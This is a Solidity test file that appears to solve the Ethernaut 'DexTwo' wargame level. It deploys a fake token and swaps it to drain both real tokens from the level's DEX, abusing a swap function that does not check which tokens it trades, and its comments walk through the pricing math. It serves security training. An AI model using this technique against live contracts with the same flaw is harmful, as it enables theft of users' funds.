// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/DexTwo.sol";
import "src/levels/DexTwoFactory.sol";

contract TestDexTwo is BaseTest {
    DexTwo private level;
    ERC20 DexToken1;
    ERC20 DexToken2;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new DexTwoFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance{value: 1 ether}(true));
        level = DexTwo(levelAddress);

        DexToken1 = ERC20(level.token1());
        DexToken2 = ERC20(level.token2());

        // Check that the contract is correctly setup
        assertEq(DexToken1.balanceOf(address(level)) == 100 && DexToken2.balanceOf(address(level)) == 100, true);
        assertEq(DexToken1.balanceOf(player) == 10 && DexToken2.balanceOf(player) == 10, true);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player);

        // DexTwo contract code is same as Dex, the difference is that now there is no require check in swap function
        // that makes sure that we can only swap token1 and token2 set in DexTwo contract.

        // Another change is that DexTwo contract has an additional fn "add_liquidity" but it's of no use
        // cause it's an owner only function.

        // 1. Creating a fake token with initial supply of 4 tokens
        SwappableTokenTwo fakeToken = new SwappableTokenTwo(address(level), "Fake Token", "FT", 4);

        // 2. Approving DexTwo contract to spend our fakeToken
        fakeToken.approve(player, address(level), 4);

        // 3. Transferring 1 fake token to DexTwo contract. We can transfer any amount of tokens, doesn't really matter
        // as far as we are sending amount of fake tokens that equals DexTwo balance of fake token
        fakeToken.transfer(address(level), 1);

        // 100 token1 = amountOfFakeTokenToSell * DexBalanceOfToken1 / DexBalanceOfFakeToken
        // You can see in above formula that "amountOfFakeTokenToSell" and "DexBalanceOfFakeToken" will cancel each
        // other if they are same

        // 100 = amountOfFakeTokenToSell * 100 / 1
        // amountOfFakeTokenToSell = 1

        // Since, we have already transferred 1 fakeToken in DexTwo contract, it's balance is 1
        // Therefore, swapping 1 fakeToken
        level.swap(address(fakeToken), address(DexToken1), 1);

        // After this txn, DexTwo balance of fake token is 2 (1 we transferred directly, and 1 was transferred in swap txn)
        // So, swapping 2 tokens again will cancel the DexBalanceOfFakeToken which is 2

        // 100 token2 = amountOfFakeTokenToSell * DexBalanceOfToken2 / DexBalanceOfFakeToken
        // 100 = amountOfFakeTokenToSell * 100 / 2
        // amountOfFakeTokenToSell = 2
        level.swap(address(fakeToken), address(DexToken2), 2);

        vm.stopPrank();

        assertEq(DexToken1.balanceOf(address(level)) == 0 && DexToken2.balanceOf(address(level)) == 0, true);
    }
}
